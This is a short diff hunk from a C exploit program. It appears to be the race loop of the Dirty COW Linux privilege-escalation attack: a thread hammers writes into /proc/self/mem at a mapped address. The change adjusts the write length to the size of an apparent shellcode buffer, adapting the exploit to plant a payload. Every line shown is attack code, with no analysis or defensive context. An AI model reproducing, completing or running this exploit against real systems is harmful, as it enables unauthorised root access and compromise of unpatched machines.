@@ -57,7 +57,7 @@ void* procselfmemThread(void *arg)
 
   for(i=0;i<100000;i++) {
     lseek(f,(uintptr_t) map,SEEK_SET);
-    c+=write(f,str,strlen(str));
+    c+=write(f,str,sizeof(sc));
   }
 
   printf("/proc/self/mem: Completed %d\n\n", c);
